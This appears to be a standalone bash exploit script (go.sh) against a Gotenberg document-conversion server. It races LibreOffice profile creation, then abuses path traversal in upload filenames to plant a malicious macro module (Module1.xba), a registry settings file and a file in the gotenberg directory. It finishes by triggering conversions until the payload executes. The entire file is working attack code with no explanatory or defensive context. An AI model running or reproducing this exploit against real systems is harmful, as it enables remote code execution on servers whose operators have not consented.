#!/bin/bash
if [ "$1" == "" ]; then
    echo "Usage: ./go.sh http://gotenberg.url"
    exit 1
fi
i=1
while [ 1 ]; do
  echo -ne "\r$i"
  for j in `seq 1 30`; do 
    curl "$1/convert/office" --form files=@o.ods --header 'Content-Type: multipart/form-data' -o /dev/null -s &
  done;
  for job in `jobs -p`
  do
    wait $job
  done
  i=$(($i + 1))
  for j in `seq 44639 2 44670`; do
      sed "s#44639#$j#g" findprofile.html > i.html
      if [ "" == "$(curl "$1/convert/markdown" -s --form "files=@i.html;filename=index.html" --header 'Content-Type: multipart/form-data' | grep 'internal error')" ]; then 
        echo -ne "\rFOUND! "
        break 2
      fi
  done
done
echo "Uploading payload.."

for i in `seq 44639 2 44750`; do
    curl "$1/convert/markdown" -s --form files=@index.html --form "files=@registrymodifications.xcu;filename=../../../../tmp/$i/user/registrymodifications.xcu" --form "files=@Module1.xba;filename=../../../../tmp/$i/user/basic/Standard/Module1.xba" --header 'Content-Type: multipart/form-data' -o /dev/null &
done
for job in `jobs -p`; do
    wait $job
done
curl "$1/convert/markdown" -s --form files=@index.html --form "files=@e;filename=../../../../gotenberg/e" --header 'Content-Type: multipart/form-data' -o /dev/null &

echo "Executing.."
i=1
while [ 1 ]; do
  echo -ne "\r$i"
  for j in `seq 1 30`; do 
    curl "$1/convert/office" --form files=@o.ods --header 'Content-Type: multipart/form-data' -o /dev/null -s &
  done;
  for job in `jobs -p`
  do
    wait $job
  done
  i=$(($i + 1))
  if [ "" == "$(curl "$1/convert/markdown" -s --form "files=@findsploit.html;filename=index.html" --header 'Content-Type: multipart/form-data' | grep 'internal error')" ]; then 
    echo -ne "\rEXECUTED! "
    break 
  fi

  if [ "$(( $i % 10 ))" == "0" ]; then
      for i in `seq 44639 2 44750`; do
          curl "$1/convert/markdown" -s --form files=@index.html --form "files=@registrymodifications.xcu;filename=../../../../tmp/$i/user/registrymodifications.xcu" --form "files=@Module1.xba;filename=../../../../tmp/$i/user/basic/Standard/Module1.xba" --header 'Content-Type: multipart/form-data' -o /dev/null &
      done      
  fi
done
